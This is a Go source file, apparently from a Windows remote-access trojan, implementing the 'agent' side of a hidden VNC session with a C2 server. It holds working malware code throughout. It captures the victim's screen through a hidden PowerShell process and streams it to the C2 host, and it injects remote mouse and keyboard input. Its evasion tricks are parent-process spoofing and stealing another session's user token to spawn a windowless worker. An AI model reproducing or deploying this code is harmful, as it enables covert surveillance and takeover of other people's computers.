//go:build windows

package agent

import (
	"bufio"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ── VNC frame protocol constants ──────────────────────────────────────────────
// Header: [1B type][4B payloadLen LE]

const (
	// Agent → server
	vncFRAME byte = 0x01 // [2B w LE][2B h LE][jpeg bytes]
	vncINFO  byte = 0x02 // JSON: {"w":N,"h":N}
	vncPONG  byte = 0x03

	// Server → agent
	vncMOUSE_MOVE  byte = 0x10 // [4B x LE][4B y LE]
	vncMOUSE_CLICK byte = 0x11 // [4B x LE][4B y LE][1B btn 1/2/3][1B down 1/0]
	vncMOUSE_WHEEL byte = 0x12 // [4B delta LE signed]
	vncKEY         byte = 0x13 // [2B vk LE][1B down 1/0]
	vncSTOP        byte = 0x14
	vncPING        byte = 0x15
	vncQUALITY     byte = 0x16 // [1B 1-100]
)

// ── SendInput Win32 structures ────────────────────────────────────────────────

var (
	procSendInput    = windows.NewLazySystemDLL("user32.dll").NewProc("SendInput")
	procSetCursorPos = windows.NewLazySystemDLL("user32.dll").NewProc("SetCursorPos")
)

// Windows INPUT type constants
const (
	inputMOUSE    = uint32(0)
	inputKEYBOARD = uint32(1)
)

// Mouse event flags
const (
	mouseMOVE        = uint32(0x0001)
	mouseLEFTDOWN    = uint32(0x0002)
	mouseLEFTUP      = uint32(0x0004)
	mouseRIGHTDOWN   = uint32(0x0008)
	mouseRIGHTUP     = uint32(0x0010)
	mouseMIDDLEDOWN  = uint32(0x0020)
	mouseMIDDLEUP    = uint32(0x0040)
	mouseWHEEL       = uint32(0x0800)
	mouseABSOLUTE    = uint32(0x8000)
)

// Keyboard event flags
const (
	keyEVENTF_KEYUP = uint32(0x0002)
)

// buildMouseAbs builds a 40-byte INPUT structure for an absolute mouse event.
// On x64: type(4)+pad(4)+dx(4)+dy(4)+mouseData(4)+flags(4)+time(4)+pad(4)+extraInfo(8) = 40
func buildMouseAbs(x, y int32, flags, mouseData uint32) [40]byte {
	var b [40]byte
	binary.LittleEndian.PutUint32(b[0:4], inputMOUSE)
	binary.LittleEndian.PutUint32(b[8:12], uint32(x))
	binary.LittleEndian.PutUint32(b[12:16], uint32(y))
	binary.LittleEndian.PutUint32(b[16:20], mouseData)
	binary.LittleEndian.PutUint32(b[20:24], flags)
	return b
}

// buildKeyEvent builds a 40-byte INPUT structure for a keyboard event.
// On x64: type(4)+pad(4)+vk(2)+scan(2)+flags(4)+time(4)+pad(4)+extraInfo(8)+pad(8) = 40
func buildKeyEvent(vk uint16, flags uint32) [40]byte {
	var b [40]byte
	binary.LittleEndian.PutUint32(b[0:4], inputKEYBOARD)
	binary.LittleEndian.PutUint16(b[8:10], vk)
	// wScan at [10:12] = 0
	binary.LittleEndian.PutUint32(b[12:16], flags)
	return b
}

func sendInputs(inputs [][40]byte) {
	if len(inputs) == 0 {
		return
	}
	flat := make([]byte, 40*len(inputs))
	for i, inp := range inputs {
		copy(flat[i*40:], inp[:])
	}
	procSendInput.Call(
		uintptr(len(inputs)),
		uintptr(unsafe.Pointer(&flat[0])),
		40,
	)
}

// ── Screen capture via persistent PowerShell subprocess ──────────────────────

// vncCaptureFrame holds one decoded frame from the capture subprocess.
type vncCaptureFrame struct {
	jpeg []byte
	w, h int32
}

// startCapturePS launches a persistent PowerShell process that captures JPEG
// frames at ~15 FPS and writes them to stdout as "W,H,<base64>\n" lines.
// Returns a channel that delivers frames; closing stopCh terminates the process.
func startCapturePS(quality int, stopCh <-chan struct{}) <-chan vncCaptureFrame {
	ch := make(chan vncCaptureFrame, 2)
	ps := `$q=` + strconv.Itoa(quality) + `;` +
		`Add-Type -AssemblyName System.Drawing,System.Windows.Forms;` +
		`while($true){try{` +
		`$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;` +
		`$bmp=[System.Drawing.Bitmap]::new($s.Width,$s.Height);` +
		`$gfx=[System.Drawing.Graphics]::FromImage($bmp);` +
		`$gfx.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);` +
		`$ms=[System.IO.MemoryStream]::new();` +
		`$ec=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|` +
		`Where-Object{$_.MimeType-eq'image/jpeg'};` +
		`$ep=[System.Drawing.Imaging.EncoderParameters]::new(1);` +
		`$ep.Param[0]=[System.Drawing.Imaging.EncoderParameter]::new(` +
		`[System.Drawing.Imaging.Encoder]::Quality,[long]$q);` +
		`$bmp.Save($ms,$ec,$ep);` +
		`Write-Output "$($s.Width),$($s.Height),$([Convert]::ToBase64String($ms.ToArray()))";` +
		`$gfx.Dispose();$bmp.Dispose();$ms.Dispose()` +
		`}catch{};Start-Sleep -Milliseconds 66}`
	cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", ps)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		close(ch)
		return ch
	}
	if err := cmd.Start(); err != nil {
		close(ch)
		return ch
	}
	go func() {
		defer close(ch)
		defer cmd.Process.Kill()
		scanner := bufio.NewScanner(stdout)
		scanner.Buffer(make([]byte, 4*1024*1024), 4*1024*1024)
		for {
			select {
			case <-stopCh:
				return
			default:
			}
			if !scanner.Scan() {
				return
			}
			line := strings.TrimSpace(scanner.Text())
			parts := strings.SplitN(line, ",", 3)
			if len(parts) != 3 {
				continue
			}
			var w, h int64
			fmt.Sscan(parts[0], &w)
			fmt.Sscan(parts[1], &h)
			data, err := base64.StdEncoding.DecodeString(parts[2])
			if err != nil || len(data) == 0 {
				continue
			}
			frame := vncCaptureFrame{jpeg: data, w: int32(w), h: int32(h)}
			select {
			case ch <- frame:
			default:
				// drop frame if consumer is slow
				select {
				case <-ch:
				default:
				}
				ch <- frame
			}
		}
	}()
	return ch
}

// ── Input handling ────────────────────────────────────────────────────────────

// vncVirtualScreenBounds returns the virtual screen dimensions (all monitors combined).
// Falls back to primary monitor if virtual screen is not available.
func vncVirtualScreenBounds() (x, y, w, h int32) {
	vx, _, _ := procGetSystemMetrics.Call(SM_XVIRTUALSCREEN)
	vy, _, _ := procGetSystemMetrics.Call(SM_YVIRTUALSCREEN)
	vw, _, _ := procGetSystemMetrics.Call(SM_CXVIRTUALSCREEN)
	vh, _, _ := procGetSystemMetrics.Call(SM_CYVIRTUALSCREEN)
	if int32(vw) <= 0 {
		vw, _, _ = procGetSystemMetrics.Call(SM_CXSCREEN)
		vx = 0
	}
	if int32(vh) <= 0 {
		vh, _, _ = procGetSystemMetrics.Call(SM_CYSCREEN)
		vy = 0
	}
	return int32(vx), int32(vy), int32(vw), int32(vh)
}

const mouseVIRTUALDESK = uint32(0x4000) // MOUSEEVENTF_VIRTUALDESK

func vncHandleInput(typ byte, payload []byte) {
	switch typ {
	case vncMOUSE_MOVE:
		if len(payload) < 8 {
			return
		}
		x := int32(binary.LittleEndian.Uint32(payload[0:4]))
		y := int32(binary.LittleEndian.Uint32(payload[4:8]))
		// Use virtual screen metrics for multi-monitor support
		_, _, sw, sh := vncVirtualScreenBounds()
		nx := int32(65535 * x / sw)
		ny := int32(65535 * y / sh)
		inp := buildMouseAbs(nx, ny, mouseABSOLUTE|mouseMOVE|mouseVIRTUALDESK, 0)
		sendInputs([][40]byte{inp})

	case vncMOUSE_CLICK:
		if len(payload) < 10 {
			return
		}
		x := int32(binary.LittleEndian.Uint32(payload[0:4]))
		y := int32(binary.LittleEndian.Uint32(payload[4:8]))
		btn := payload[8]
		down := payload[9] != 0

		_, _, sw, sh := vncVirtualScreenBounds()
		nx := int32(65535 * x / sw)
		ny := int32(65535 * y / sh)

		var clickFlag uint32
		switch btn {
		case 1:
			if down {
				clickFlag = mouseLEFTDOWN
			} else {
				clickFlag = mouseLEFTUP
			}
		case 2:
			if down {
				clickFlag = mouseRIGHTDOWN
			} else {
				clickFlag = mouseRIGHTUP
			}
		case 3:
			if down {
				clickFlag = mouseMIDDLEDOWN
			} else {
				clickFlag = mouseMIDDLEUP
			}
		}
		if clickFlag != 0 {
			move := buildMouseAbs(nx, ny, mouseABSOLUTE|mouseMOVE|mouseVIRTUALDESK, 0)
			click := buildMouseAbs(nx, ny, mouseABSOLUTE|clickFlag|mouseVIRTUALDESK, 0)
			sendInputs([][40]byte{move, click})
		}

	case vncMOUSE_WHEEL:
		if len(payload) < 4 {
			return
		}
		delta := int32(binary.LittleEndian.Uint32(payload[0:4]))
		inp := buildMouseAbs(0, 0, mouseWHEEL, uint32(delta))
		sendInputs([][40]byte{inp})

	case vncKEY:
		if len(payload) < 3 {
			return
		}
		vk := binary.LittleEndian.Uint16(payload[0:2])
		down := payload[2] != 0
		flags := uint32(0)
		if !down {
			flags = keyEVENTF_KEYUP
		}
		inp := buildKeyEvent(vk, flags)
		sendInputs([][40]byte{inp})
	}
}

// ── VNC session ───────────────────────────────────────────────────────────────

type vncSession struct {
	conn    net.Conn
	quality int
	stop    chan struct{}
	once    sync.Once
}

func (s *vncSession) shutdown() {
	s.once.Do(func() {
		close(s.stop)
		s.conn.Close()
	})
}

var (
	vncMu      sync.Mutex
	vncCurrent *vncSession
)

// sendVNCFrame writes a framed VNC message: [1B type][4B len LE][payload]
func sendVNCFrame(conn net.Conn, typ byte, payload []byte) error {
	hdr := make([]byte, 5)
	hdr[0] = typ
	binary.LittleEndian.PutUint32(hdr[1:5], uint32(len(payload)))
	if _, err := conn.Write(hdr); err != nil {
		return err
	}
	if len(payload) > 0 {
		_, err := conn.Write(payload)
		return err
	}
	return nil
}

// readVNCFrame reads one VNC frame from the connection.
func readVNCFrame(conn net.Conn) (byte, []byte, error) {
	hdr := make([]byte, 5)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return 0, nil, err
	}
	typ := hdr[0]
	plen := binary.LittleEndian.Uint32(hdr[1:5])
	if plen > 4*1024*1024 {
		return 0, nil, fmt.Errorf("frame too large: %d bytes", plen)
	}
	payload := make([]byte, plen)
	if plen > 0 {
		if _, err := io.ReadFull(conn, payload); err != nil {
			return 0, nil, err
		}
	}
	return typ, payload, nil
}

// vncStart dials the C2 callback port and begins a VNC streaming session.
func vncStart(callbackPort string, quality int) error {
	host := serverHost(ServerURL)
	if host == "" {
		return fmt.Errorf("vnc: cannot determine server host from ServerURL %q", ServerURL)
	}

	addr := net.JoinHostPort(host, callbackPort)
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return fmt.Errorf("vnc: dial %s: %w", addr, err)
	}

	sess := &vncSession{
		conn:    conn,
		quality: quality,
		stop:    make(chan struct{}),
	}

	vncMu.Lock()
	if vncCurrent != nil {
		vncCurrent.shutdown()
	}
	vncCurrent = sess
	vncMu.Unlock()

	go sess.run()
	return nil
}

// vncStop terminates the current VNC session.
func vncStop() string {
	vncMu.Lock()
	sess := vncCurrent
	vncCurrent = nil
	vncMu.Unlock()

	if sess == nil {
		return "[-] VNC not running"
	}
	sess.shutdown()
	return "[+] VNC session stopped"
}

func (s *vncSession) run() {
	defer s.shutdown()

	// Start persistent PowerShell capture subprocess.
	// PS uses CopyFromScreen which works in any session context.
	vncMu.Lock()
	q := s.quality
	vncMu.Unlock()
	capCh := startCapturePS(q, s.stop)

	// Wait for first frame to determine screen dimensions for INFO.
	var firstFrame vncCaptureFrame
	select {
	case <-s.stop:
		return
	case f, ok := <-capCh:
		if !ok {
			return
		}
		firstFrame = f
	}

	info, _ := json.Marshal(map[string]interface{}{
		"w": int(firstFrame.w),
		"h": int(firstFrame.h),
	})
	if err := sendVNCFrame(s.conn, vncINFO, info); err != nil {
		return
	}
	// Send first frame immediately.
	p0 := make([]byte, 4+len(firstFrame.jpeg))
	binary.LittleEndian.PutUint16(p0[0:2], uint16(firstFrame.w))
	binary.LittleEndian.PutUint16(p0[2:4], uint16(firstFrame.h))
	copy(p0[4:], firstFrame.jpeg)
	_ = sendVNCFrame(s.conn, vncFRAME, p0)

	// Goroutine: receive input events from server
	inputDone := make(chan struct{})
	go func() {
		defer close(inputDone)
		for {
			typ, payload, err := readVNCFrame(s.conn)
			if err != nil {
				return
			}
			switch typ {
			case vncSTOP:
				s.shutdown()
				return
			case vncPING:
				_ = sendVNCFrame(s.conn, vncPONG, nil)
			case vncQUALITY:
				if len(payload) >= 1 {
					newQ := int(payload[0])
					if newQ >= 1 && newQ <= 100 {
						vncMu.Lock()
						s.quality = newQ
						vncMu.Unlock()
					}
				}
			default:
				vncHandleInput(typ, payload)
			}
		}
	}()

	// Main loop: forward frames from capture subprocess to C2.
	for {
		select {
		case <-s.stop:
			return
		case <-inputDone:
			return
		case frame, ok := <-capCh:
			if !ok {
				return
			}
			payload := make([]byte, 4+len(frame.jpeg))
			binary.LittleEndian.PutUint16(payload[0:2], uint16(frame.w))
			binary.LittleEndian.PutUint16(payload[2:4], uint16(frame.h))
			copy(payload[4:], frame.jpeg)
			if err := sendVNCFrame(s.conn, vncFRAME, payload); err != nil {
				return
			}
		}
	}
}

// RunVNCMode is the entry point for a process spawned in VNC daemon mode.
// It dials the server callback port, streams frames, and exits when done.
func RunVNCMode(port, quality int) {
	if quality <= 0 || quality > 100 {
		quality = 60
	}
	if err := vncStart(strconv.Itoa(port), quality); err != nil {
		return
	}
	vncMu.Lock()
	sess := vncCurrent
	vncMu.Unlock()
	if sess != nil {
		<-sess.stop
	}
}

// vncSpawnInject spawns the current executable in VNC daemon mode
// (--vnc-mode <port> <quality>), PPID-spoofed to targetPID when > 0.
// Returns the spawned child PID.
func vncSpawnInject(callbackPort string, quality, targetPID int) (uint32, error) {
	exe, err := os.Executable()
	if err != nil {
		return 0, fmt.Errorf("vnc inject: %w", err)
	}
	cmdLine := fmt.Sprintf(`"%s" --vnc-mode %s %d`, exe, callbackPort, quality)
	cmdW, _ := windows.UTF16PtrFromString(cmdLine)

	type siExT struct {
		si      windows.StartupInfo
		attrPtr uintptr
	}
	siEx := siExT{}
	const EXTENDED_STARTUPINFO_PRESENT = 0x00080000
	flags := uint32(windows.CREATE_NO_WINDOW)

	if targetPID > 0 {
		parentH, perr := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, uint32(targetPID))
		if perr == nil {
			defer windows.CloseHandle(parentH)

			var sz uintptr
			procInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&sz)))
			attrList := make([]byte, sz)
			r, _, _ := procInitializeProcThreadAttributeList.Call(
				uintptr(unsafe.Pointer(&attrList[0])), 1, 0, uintptr(unsafe.Pointer(&sz)),
			)
			if r != 0 {
				defer procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(&attrList[0])))
				procUpdateProcThreadAttribute.Call(
					uintptr(unsafe.Pointer(&attrList[0])), 0,
					uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
					uintptr(unsafe.Pointer(&parentH)),
					unsafe.Sizeof(parentH), 0, 0,
				)
				siEx.si.Flags = windows.STARTF_USESHOWWINDOW
				siEx.si.ShowWindow = 0
				siEx.attrPtr = uintptr(unsafe.Pointer(&attrList[0]))
				siEx.si.Cb = uint32(unsafe.Sizeof(siEx))
				flags |= EXTENDED_STARTUPINFO_PRESENT
			}
		}
	}
	if siEx.si.Cb == 0 {
		siEx.si.Cb = uint32(unsafe.Sizeof(siEx.si))
	}

	var pi windows.ProcessInformation
	if err := windows.CreateProcess(nil, cmdW, nil, nil, false, flags, nil, nil, &siEx.si, &pi); err != nil {
		return 0, fmt.Errorf("vnc inject: CreateProcess: %w", err)
	}
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	return pi.ProcessId, nil
}

// ── Worker-pipe mode ──────────────────────────────────────────────────────────
//
// vncStartWorker creates a named pipe server, spawns this agent binary with
// --vnc-worker <pipename> <quality> in the target session, waits for the worker
// to connect, then relays standard VNC frames from the pipe to the C2 TCP conn.
//
// The worker process runs inside the interactive session, so its GDI / PowerShell
// capture sees the real desktop. The parent relays frames without re-encoding.

var (
	procWTSQueryUserToken    = windows.NewLazySystemDLL("wtsapi32.dll").NewProc("WTSQueryUserToken")
	procCreateProcessAsUserW = windows.NewLazySystemDLL("advapi32.dll").NewProc("CreateProcessAsUserW")
)

func vncStartWorker(callbackPort string, quality, targetPID, sessionID int) error {
	host := serverHost(ServerURL)
	if host == "" {
		return fmt.Errorf("vnc: cannot determine server host")
	}
	addr := net.JoinHostPort(host, callbackPort)
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return fmt.Errorf("vnc worker: dial %s: %w", addr, err)
	}

	// Generate pipe name.
	var idBytes [4]byte
	if _, err2 := rand.Read(idBytes[:]); err2 != nil {
		conn.Close()
		return err2
	}
	pipeName := `\\.\pipe\egvnc-` + hex.EncodeToString(idBytes[:])

	// Create named pipe server.
	pipeSA := &windows.SecurityAttributes{Length: uint32(unsafe.Sizeof(windows.SecurityAttributes{}))}
	hPipe, err := windows.CreateNamedPipe(
		windows.StringToUTF16Ptr(pipeName),
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_BYTE|windows.PIPE_READMODE_BYTE|windows.PIPE_WAIT,
		1, 2*1024*1024, 2*1024*1024, 30000, pipeSA,
	)
	if err != nil {
		conn.Close()
		return fmt.Errorf("vnc worker: CreateNamedPipe: %w", err)
	}

	sess := &vncSession{conn: conn, quality: quality, stop: make(chan struct{})}
	vncMu.Lock()
	if vncCurrent != nil {
		vncCurrent.shutdown()
	}
	vncCurrent = sess
	vncMu.Unlock()

	go func() {
		defer sess.shutdown()
		defer windows.CloseHandle(hPipe)

		// Spawn worker in target session.
		if err := spawnVNCWorker(pipeName, quality, targetPID, sessionID); err != nil {
			return
		}

		// Wait for worker to connect.
		connCh := make(chan error, 1)
		go func() {
			e := windows.ConnectNamedPipe(hPipe, nil)
			if e != nil && e.(windows.Errno) != windows.ERROR_PIPE_CONNECTED {
				connCh <- e
				return
			}
			connCh <- nil
		}()
		select {
		case <-sess.stop:
			return
		case err := <-connCh:
			if err != nil {
				return
			}
		case <-time.After(30 * time.Second):
			return
		}

		// Relay pipe frames → C2 TCP, and C2 input → pipe.
		go func() {
			// Input: C2 → pipe
			for {
				typ, payload, err := readVNCFrame(conn)
				if err != nil {
					sess.shutdown()
					return
				}
				if typ == vncSTOP {
					sess.shutdown()
					return
				}
				sendVNCFrameRW(&windowsPipeRW{h: hPipe}, typ, payload)
			}
		}()

		pipeRW := &windowsPipeRW{h: hPipe}
		for {
			select {
			case <-sess.stop:
				return
			default:
			}
			hdr := make([]byte, 5)
			if _, err := io.ReadFull(pipeRW, hdr); err != nil {
				return
			}
			typ := hdr[0]
			plen := binary.LittleEndian.Uint32(hdr[1:5])
			if plen > 8*1024*1024 {
				return
			}
			payload := make([]byte, plen)
			if plen > 0 {
				if _, err := io.ReadFull(pipeRW, payload); err != nil {
					return
				}
			}
			if err := sendVNCFrame(conn, typ, payload); err != nil {
				return
			}
		}
	}()
	return nil
}

// spawnVNCWorker spawns the agent binary with --vnc-worker in the target session.
// If sessionID > 0, uses WTSQueryUserToken + CreateProcessAsUser for cross-session.
// If targetPID > 0, PPID-spoofs to that PID.
func spawnVNCWorker(pipeName string, quality, targetPID, sessionID int) error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	cmdLine := fmt.Sprintf(`"%s" --vnc-worker "%s" %d`, exe, pipeName, quality)
	cmdW, _ := windows.UTF16PtrFromString(cmdLine)

	if sessionID > 0 {
		// Cross-session: get primary token for target session.
		var hTok uintptr
		r, _, e := procWTSQueryUserToken.Call(uintptr(sessionID), uintptr(unsafe.Pointer(&hTok)))
		if r == 0 {
			return fmt.Errorf("WTSQueryUserToken(%d): %w", sessionID, e)
		}
		defer windows.CloseHandle(windows.Handle(hTok))

		// Duplicate to primary token (WTSQueryUserToken already gives primary).
		var hPrimary uintptr
		r, _, e = procDuplicateTokenEx.Call(
			hTok,
			uintptr(windows.TOKEN_ALL_ACCESS),
			0,
			uintptr(windows.SecurityImpersonation),
			uintptr(windows.TokenPrimary),
			uintptr(unsafe.Pointer(&hPrimary)),
		)
		if r == 0 {
			return fmt.Errorf("DuplicateTokenEx: %w", e)
		}
		defer windows.CloseHandle(windows.Handle(hPrimary))

		si := windows.StartupInfo{Flags: windows.STARTF_USESHOWWINDOW, ShowWindow: 0}
		si.Cb = uint32(unsafe.Sizeof(si))
		var pi windows.ProcessInformation
		r, _, e = procCreateProcessAsUserW.Call(
			hPrimary, 0, uintptr(unsafe.Pointer(cmdW)),
			0, 0, 0,
			uintptr(windows.CREATE_NO_WINDOW),
			0, 0,
			uintptr(unsafe.Pointer(&si)),
			uintptr(unsafe.Pointer(&pi)),
		)
		if r == 0 {
			return fmt.Errorf("CreateProcessAsUser: %w", e)
		}
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
		return nil
	}

	// Same session: optional PPID spoof.
	type siExT struct {
		si      windows.StartupInfo
		attrPtr uintptr
	}
	siEx := siExT{}
	const EXTENDED_STARTUPINFO_PRESENT = 0x00080000
	flags := uint32(windows.CREATE_NO_WINDOW)

	if targetPID > 0 {
		parentH, perr := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, uint32(targetPID))
		if perr == nil {
			defer windows.CloseHandle(parentH)
			var sz uintptr
			procInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&sz)))
			attrList := make([]byte, sz)
			r, _, _ := procInitializeProcThreadAttributeList.Call(
				uintptr(unsafe.Pointer(&attrList[0])), 1, 0, uintptr(unsafe.Pointer(&sz)),
			)
			if r != 0 {
				defer procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(&attrList[0])))
				procUpdateProcThreadAttribute.Call(
					uintptr(unsafe.Pointer(&attrList[0])), 0,
					uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
					uintptr(unsafe.Pointer(&parentH)),
					unsafe.Sizeof(parentH), 0, 0,
				)
				siEx.si.Flags = windows.STARTF_USESHOWWINDOW
				siEx.si.ShowWindow = 0
				siEx.attrPtr = uintptr(unsafe.Pointer(&attrList[0]))
				siEx.si.Cb = uint32(unsafe.Sizeof(siEx))
				flags |= EXTENDED_STARTUPINFO_PRESENT
			}
		}
	}
	if siEx.si.Cb == 0 {
		siEx.si.Cb = uint32(unsafe.Sizeof(siEx.si))
	}
	var pi windows.ProcessInformation
	if err := windows.CreateProcess(nil, cmdW, nil, nil, false, flags, nil, nil, &siEx.si, &pi); err != nil {
		return fmt.Errorf("worker CreateProcess: %w", err)
	}
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	return nil
}

// RunVNCWorkerMode is the entry point for a process spawned with --vnc-worker.
// It connects to the parent's named pipe, captures the screen, and sends frames.
func RunVNCWorkerMode(pipeName string, quality int) {
	// Connect to named pipe server (parent agent).
	// Retry for up to 30 s while parent creates the server.
	var hPipe windows.Handle
	var err error
	for i := 0; i < 300; i++ {
		hPipe, err = windows.CreateFile(
			windows.StringToUTF16Ptr(pipeName),
			windows.GENERIC_READ|windows.GENERIC_WRITE,
			0, nil, windows.OPEN_EXISTING,
			windows.FILE_ATTRIBUTE_NORMAL, 0,
		)
		if err == nil {
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if err != nil {
		return
	}
	defer windows.CloseHandle(hPipe)

	pipeRW := &windowsPipeRW{h: hPipe}
	stopCh := make(chan struct{})

	// Start screen capture (PowerShell CopyFromScreen — works inside interactive session).
	capCh := startCapturePS(quality, stopCh)

	// Wait for first frame; send INFO.
	var firstFrame vncCaptureFrame
	select {
	case f, ok := <-capCh:
		if !ok {
			return
		}
		firstFrame = f
	case <-time.After(30 * time.Second):
		return
	}

	info, _ := json.Marshal(map[string]interface{}{"w": int(firstFrame.w), "h": int(firstFrame.h)})
	if err := sendVNCFrameRW(pipeRW, vncINFO, info); err != nil {
		return
	}
	// Send first frame.
	p0 := make([]byte, 4+len(firstFrame.jpeg))
	binary.LittleEndian.PutUint16(p0[0:2], uint16(firstFrame.w))
	binary.LittleEndian.PutUint16(p0[2:4], uint16(firstFrame.h))
	copy(p0[4:], firstFrame.jpeg)
	_ = sendVNCFrameRW(pipeRW, vncFRAME, p0)

	// Input goroutine: pipe → SendInput.
	go func() {
		for {
			hdr := make([]byte, 5)
			if _, err2 := io.ReadFull(pipeRW, hdr); err2 != nil {
				close(stopCh)
				return
			}
			typ := hdr[0]
			plen := binary.LittleEndian.Uint32(hdr[1:5])
			payload := make([]byte, plen)
			if plen > 0 {
				if _, err2 := io.ReadFull(pipeRW, payload); err2 != nil {
					close(stopCh)
					return
				}
			}
			switch typ {
			case vncSTOP:
				close(stopCh)
				return
			case vncPING:
				_ = sendVNCFrameRW(pipeRW, vncPONG, nil)
			default:
				vncHandleInput(typ, payload)
			}
		}
	}()

	// Frame relay: capture → pipe.
	for frame := range capCh {
		p := make([]byte, 4+len(frame.jpeg))
		binary.LittleEndian.PutUint16(p[0:2], uint16(frame.w))
		binary.LittleEndian.PutUint16(p[2:4], uint16(frame.h))
		copy(p[4:], frame.jpeg)
		if err := sendVNCFrameRW(pipeRW, vncFRAME, p); err != nil {
			return
		}
	}
}
